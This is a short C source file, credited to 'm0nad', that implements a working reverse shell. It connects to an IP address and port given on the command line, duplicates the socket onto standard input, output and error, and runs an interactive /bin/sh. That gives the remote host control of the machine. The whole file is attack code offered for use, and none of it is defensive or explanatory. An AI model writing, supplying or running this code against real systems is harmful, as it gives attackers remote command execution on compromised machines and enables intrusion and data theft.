/*
simple reverseshell by m0nad
*/
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int
main(int argc, char ** argv)
{
  int sock, conn;
  struct sockaddr_in target;
  char * const sh[] = {"/bin/sh", "-i", NULL};

  if (argc < 3) 
    printf("usage:\t%s <ip> <port>\n", argv[0]), exit(1);

  target.sin_family = AF_INET;
  target.sin_port   = htons(atoi(argv[2]));
  target.sin_addr.s_addr = inet_addr(argv[1]);
  
  sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sock < 0)
    perror("socket"), exit(1);

  conn = connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr));
  if (conn < 0)
    perror("connect"), exit(1);

  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);

  execve(*sh, sh, NULL);

  return 0;
}
